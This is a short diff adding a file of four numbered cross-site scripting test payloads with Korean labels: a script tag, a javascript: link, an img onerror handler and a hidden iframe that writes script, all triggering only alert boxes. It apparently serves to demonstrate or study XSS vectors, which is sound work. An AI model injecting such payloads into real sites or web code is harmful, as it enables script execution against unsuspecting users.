@@ -1,0 +1,23 @@
+#1
+<script>
+  alert("XSS공격!");
+</script>
+
+#2
+<a href="javascript:alert('XSS')">XSS</a>
+
+#3
+<img src="#" onerror="alert('XSS 공격!');">
+
+#4
+<IFRAME ID="showFrame" SRC="javascript:document.write('
+<script>
+alert(3);
+function show() {
+alert(5);
+}
+alert(4);
+</script>
+');" width="0" height="0" frameborder="0"></IFRAME>
+<button id="button onClick='document.getElementById
+("showFrame").contentWindow.show()'>버튼</button>
